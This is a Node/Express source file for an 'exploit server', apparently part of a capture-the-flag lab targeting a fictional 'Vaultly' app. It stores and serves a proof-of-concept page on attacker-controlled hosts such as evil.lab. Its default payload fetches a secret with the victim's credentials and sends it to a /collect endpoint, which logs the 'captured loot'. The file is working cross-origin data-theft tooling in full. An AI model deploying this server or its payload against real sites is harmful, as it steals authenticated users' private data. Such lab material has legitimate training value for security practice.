// ============================================================================
//  attacker/server.js  —  THE EXPLOIT SERVER
//  Reachable (via Caddy) at:
//     https://evil.lab                    (cross-site attacker origin)
//     https://vaultly.lab.evil.lab        (C3 payload origin)
//     https://vaultlyXlab.evil.lab        (C4 payload origin)
//     http://legacy.vaultly.lab           (C6 insecure origin)
//
//  Three jobs:
//    1. Let you store/edit a PoC page            (GET/POST /)
//    2. Serve that PoC at /e  on WHATEVER host    (origin = the host you deliver)
//    3. Collect exfiltrated data at /collect  and show it at /log
// ============================================================================
const express = require('express');
const app = express();
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
app.use(express.json({ limit: '1mb' }));

// in-memory stores (fine for a lab)
let POC = `<!doctype html>
<!-- Edit me, Store, then Deliver the right hostname to the victim bot. -->
<script>
fetch('https://api.vaultly.lab/api/c1/secret', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('/collect?d=' + encodeURIComponent(d)));
</script>`;
const LOG = [];

// The collector is deliberately permissive (it's YOUR server) so a PoC on any
// origin — even a sandboxed null-origin iframe — can exfiltrate to it.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});

// ---- 1. editor UI -------------------------------------------------------
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!doctype html><html><head><meta charset="utf-8"><title>Exploit Server</title>
<style>
 body{font-family:ui-monospace,Menlo,monospace;background:#0a0e1a;color:#dbe1ee;margin:0;padding:28px;max-width:900px;margin:0 auto}
 h1{color:#ff5a5f;font-size:20px} a{color:#f3b43a}
 textarea{width:100%;height:320px;background:#0c1120;color:#dbe1ee;border:1px solid #243049;border-radius:8px;padding:14px;font:13px/1.6 ui-monospace,monospace}
 button{background:#f3b43a;color:#1a1300;border:0;border-radius:6px;padding:10px 18px;font-weight:700;cursor:pointer;margin-top:12px}
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin:10px 0}
 code{background:#121a2e;border:1px solid #243049;padding:2px 7px;border-radius:4px;color:#f3b43a}
 .hint{color:#6b7691;font-size:13px}
</style></head><body>
<h1>&#9632; Vaultly Exploit Server</h1>
<p class="hint">Store your PoC, then deliver one of these hostnames + <code>/e</code> to the victim bot on the scoreboard:</p>
<p class="hint">
 C1 &rarr; <code>https://evil.lab/e</code> &nbsp; C3 &rarr; <code>https://vaultly.lab.evil.lab/e</code><br>
 C4 &rarr; <code>https://vaultlyXlab.evil.lab/e</code> &nbsp; C6 &rarr; <code>http://legacy.vaultly.lab/e</code><br>
 C2 (null) &rarr; deliver <code>https://evil.lab/e</code> with a sandboxed-iframe PoC.
</p>
<form method="POST" action="/store">
 <textarea name="poc">${POC.replace(/</g, '&lt;')}</textarea>
 <div class="row"><button type="submit">Store PoC</button>
 <a href="/e" target="_blank">View exploit &#8599;</a>
 <a href="/log" target="_blank">Access log &#8599;</a></div>
</form>
</body></html>`);
});

app.post('/store', (req, res) => {
  POC = req.body.poc || '';
  res.redirect('/');
});

// ---- 2. serve the stored PoC on ANY host --------------------------------
app.get('/e', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(POC);
});

// ---- 3. collector + log viewer ------------------------------------------
app.all('/collect', (req, res) => {
  const d = req.query.d || (req.body && req.body.d) || JSON.stringify(req.body || {});
  LOG.unshift({ time: new Date().toISOString(), from: req.headers.referer || '-', data: String(d) });
  res.sendStatus(204);
});

app.get('/log', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  const rows = LOG.map(
    (e) =>
      `<div style="border-bottom:1px solid #243049;padding:10px 0">
       <div style="color:#6b7691;font-size:12px">${e.time} &middot; from ${e.from}</div>
       <div style="white-space:pre-wrap;word-break:break-all;color:#39cf8f">${e.data.replace(/</g, '&lt;')}</div></div>`
  ).join('');
  res.send(`<!doctype html><html><head><meta charset="utf-8"><title>Access Log</title>
<meta http-equiv="refresh" content="3">
<style>body{font-family:ui-monospace,monospace;background:#0a0e1a;color:#dbe1ee;max-width:900px;margin:0 auto;padding:28px}
h1{color:#ff5a5f;font-size:18px}</style></head><body>
<h1>&#9632; Collector — captured loot (auto-refresh 3s)</h1>
${rows || '<p style="color:#6b7691">Nothing captured yet. Deliver a PoC to the victim.</p>'}
</body></html>`);
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`[attacker] exploit server on :${PORT}`));
